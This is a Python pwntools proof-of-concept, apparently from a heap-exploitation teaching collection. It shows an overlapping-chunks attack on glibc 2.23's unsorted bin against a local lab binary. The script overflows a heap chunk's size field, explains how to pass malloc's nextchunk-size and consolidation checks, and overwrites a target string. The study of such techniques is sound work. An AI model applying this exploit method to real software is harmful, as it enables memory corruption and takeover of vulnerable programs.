'''
Overlapping chunks POC with unsorted bin.

The main difference between this one and the tcache
is two validation checks that need to be bypassed in 
order for this to work properly.

NOTE: 
- This strategy STILL works in the unsorted bin for newer versions 
  of LibC (with tcache). However, for this size range, the tcache
  will be used. In order to use the unsorted bin, the tcache will need
  to be full (7 items) for the specific size or the chunk needs to be
  too large for the tcache. 
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../../libc_versions/2.23/libc-2.23.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = './.overlap-2.23' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env, aslr=False)
	gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.23/ 
''') 

else: 
	p = process(elf.path, env=env) 

'''
Our main goal is to overwrite the string in the 'third' chunk. 
We can do this by overlapping a chunk with this string to change
the value in a later write. 

Our heap structure looks like the following after the first 
three allocations (first, second, third): 

===============================
---- first -------
prev_size (0x0)
size (0x40) 
Chunk Data (0x30 in length)
---- second ------
prev_size (0x0) 
size (0x100) 
Chunk Data (0xf0 in length)
---- third -------
prev_size (0x0) 
size (0x40) 
Chunk data (0x30 in length)  <---- Target string
===========================

There is a linear buffer overflow in the 'first' 
chunk that allows for a write into the 'second' chunk. 
Using this, we can overwrite the size of the 'second' chunk
in order to *enlarge* the chunk to encapsulate the 'third'
chunk as well. 

Using the vulnerability, we will overwrite the size of
the chunk of 'second' to overlap with 'third'. Then, when 
we *free* 'second' and reallocate, the new chunk will be
over the top of 'third'! A visual is shown below: 

===============================
---- first -------
prev_size (0x0)
size (0x40) 
Chunk Data (0x30) 
---- second ---------------------------------------|
prev_size (0x0)                                    |
size (0x150 - was 0x100)                           |
Chunk Data (0xf0 in length)                        |
---- third -------                                 |
prev_size (0x0)                                    |
size (0x40)                                        |
Chunk data (0x30 in length)  <---- Target string   |
<--------------------------------------------------|
===========================

Now, 'second' overlaps 'third'. 
Later on, a request will be made to malloc for
a chunk of size 0x150. This is the reason we expand
the chunk to be this size, as this size is requested later
(meaning that the chunk will be used). 

With the overlapped chunk, we can now overwrite
the string within 'third'.
'''

'''
This overwrites the size of the 'second' chunk, which 
is then freed shortly thereafter.
The chunk itself is 0x40 bytes total and has 30 bytes for 
a data section. So, we will fill these bytes to start with,
then overwrite the SIZE of the next chunk. 

We use '0x150' exactly because a future allocation uses 
this size! Once that allocation is made, it will return 
our extended chunk over the top of the 'third' chunk. 

For the unsorted bin/fastbin variation, we have a few extra 
checks to worry about...

1. The nextchunk size validation. For both, fastbin and unsorted
   bin chunks, the 'nextchunk' size has to be a valid chunk. 
   This means that it cannot be too BIG (system_mem) and it
   cannot be too SMALL (0x20 on 64-bit 0x10 on 32-bit).
   - https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3897
   - https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3992

   In order to bypass this check, we can WRITE a value that 
   is the proper size (between the values stated above). Or
   we can use the actual NEXT chunk (skip over a chunk) get the 
   proper size. 

2. Consolidation. Consolidation is the process of COMBINING free 
   chunks that are next to each other. The chunk being freed into
   the unsorted bin knows WHEN to consolidate BELOW based upon 
   the 'prev_inuse' bit of the CURRENT chunk being freed.
   - https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4002
   
   Additionally, the chunk ABOVE is free if the 'prev_inuse' bit
   of the next next (two chunks above the current) has the 
   'prev_inuse' bit is NOT set.
   - https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4009

   Keep these two checks in mind when choosing a fake chunk
   size and location.


For #1, we can use the chunk directly ABOVE 'third' chunk. This
is something created by LibC, and not something that we created 
with malloc directly. Although this looks very odd, we just need
to get passed the nextchunk size validation check. In reality, 
the heap looks like the following below with this attack: 

===============================
---- first -------
prev_size (0x0)
size (0x40) 
Chunk Data (0x30) 
---- second ---------------------------------------|
prev_size (0x0)                                    |
size (0x150 - was 0x100)                           |
Chunk Data (0xf0 in length)                        |
---- third -------                                 |
prev_size (0x0)                                    |
size (0x40)                                        |
Chunk data (0x30 in length)  <---- Target string   |
<--------------------------------------------------|
---- libc chunk -----   <---- Use as the 'nextchunk'
prev_size (0x0) 
size (0x1011) 
===========================

The important thing to note is that the 'libc chunk' can 
be used as a legit check to bypass the verification!
0x150 happens to line up to the size of the 'libc chunk!'

For #2, we set the SIZE to have the 'prev_inuse' bit
set in order to prevent consolidation, as this would cause
an immediate crash on the 'unlink' macro. Whether the 
chunk above attempts to consolidate with our current chunk
does not matter in this case; regardless, this should work fine. 
'''
fake_chunk = b"B" * 0x30 # Filler
fake_chunk += p64(0x0) # prev_size
fake_chunk += p64(0x151) # size with prev_inuse bit set
p.sendline(fake_chunk) 

'''
The original chunk size was 0x100, with 0xf0 being used for data. 
So, we first 0xf0 (data size) bytes. Then, we fill the 
size and prev_size with garbage. Finally, the next section of
data will overlap with the 'third' pointer, allowing us to change
the value of the string. 

=================================
---- second ---------------------------------------|
prev_size (0x0)                                    |
size (0x150 - was 0x100)                           |
Chunk Data (0xf0 in length)                        |
---- third ------- <---------- Overlaps HERE!      |
prev_size (0x0)                                    |
size (0x40)                                        |
Chunk data (0x30 in length)  <---- Target string   |
<--------------------------------------------------|
=================================

'''
fake_chunk = b"C" * 0xf0 # Filler
fake_chunk += b"D" * 8 # prev_size of 'third' chunk, value does not matter
fake_chunk += b"E" * 8 # size of 'third' chunk, value does not matter
fake_chunk += b"Steve Jobs\x00" # Overwrite string value with superior company
p.sendlineafter("Create chunk of size 0x150", fake_chunk) 

p.interactive()
